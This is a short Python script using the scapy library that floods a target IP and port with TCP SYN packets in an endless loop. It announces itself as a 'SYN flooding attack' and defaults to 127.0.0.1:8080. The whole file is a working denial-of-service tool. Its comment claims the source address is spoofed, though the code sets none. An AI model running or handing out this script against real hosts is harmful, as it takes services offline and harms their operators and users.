from scapy.all import *

def syn_flood(target_ip, target_port):
    # Craft a SYN packet with a spoofed source IP address
    syn_packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S", seq=12345)
    i=0
    # Send the SYN packet in a loop
    while True:
        send(syn_packet, verbose=0)
        print("Iteration: ",i)
        i=i+1

if __name__ == "__main__":
    target_ip = "127.0.0.1"
    target_port = 8080

    print(f"Initiating SYN flooding attack on {target_ip}:{target_port}...")
    syn_flood(target_ip, target_port)
